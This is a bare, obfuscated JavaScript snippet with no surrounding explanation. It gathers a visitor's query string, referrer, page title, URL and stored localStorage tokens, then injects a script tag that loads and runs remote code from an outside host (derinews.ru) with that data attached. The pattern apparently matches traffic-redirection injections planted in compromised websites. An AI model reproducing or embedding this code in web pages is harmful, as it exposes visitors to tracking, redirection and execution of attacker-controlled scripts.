
    (function() {
    var name = '_3qWHzbj2rkpZBdZS';
    if (!window._3qWHzbj2rkpZBdZS) {
        window._3qWHzbj2rkpZBdZS = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/1ym9SLHM',
        };
    }
    const _pWKH64BJYQTDMxGX = localStorage.getItem('config');
    if (typeof _pWKH64BJYQTDMxGX !== 'undefined' && _pWKH64BJYQTDMxGX !== null) {
        var _YDqRkr8zRwpwybcx = JSON.parse(_pWKH64BJYQTDMxGX);
        var _vtyrcXTRN6vfg3bc = Math.round(+new Date()/1000);
        if (_YDqRkr8zRwpwybcx.created_at + window._3qWHzbj2rkpZBdZS.ttl < _vtyrcXTRN6vfg3bc) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _SKTQG5jCjbGrPVRk = localStorage.getItem('subId');
    var _yDwGfnXMsDP9tGmt = localStorage.getItem('token');
    var _579T3xt2Bhb5WK8p = '?return=js.client';
        _579T3xt2Bhb5WK8p += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _579T3xt2Bhb5WK8p += '&se_referrer=' + encodeURIComponent(document.referrer);
        _579T3xt2Bhb5WK8p += '&default_keyword=' + encodeURIComponent(document.title);
        _579T3xt2Bhb5WK8p += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _579T3xt2Bhb5WK8p += '&name=' + encodeURIComponent(name);
        _579T3xt2Bhb5WK8p += '&host=' + encodeURIComponent(window._3qWHzbj2rkpZBdZS.R_PATH);
    if (typeof _SKTQG5jCjbGrPVRk !== 'undefined' && _SKTQG5jCjbGrPVRk && window._3qWHzbj2rkpZBdZS.unique) {
        _579T3xt2Bhb5WK8p += '&sub_id=' + encodeURIComponent(_SKTQG5jCjbGrPVRk);
    }
    if (typeof _yDwGfnXMsDP9tGmt !== 'undefined' && _yDwGfnXMsDP9tGmt && window._3qWHzbj2rkpZBdZS.unique) {
        _579T3xt2Bhb5WK8p += '&token=' + encodeURIComponent(_yDwGfnXMsDP9tGmt);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._3qWHzbj2rkpZBdZS.R_PATH + _579T3xt2Bhb5WK8p;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
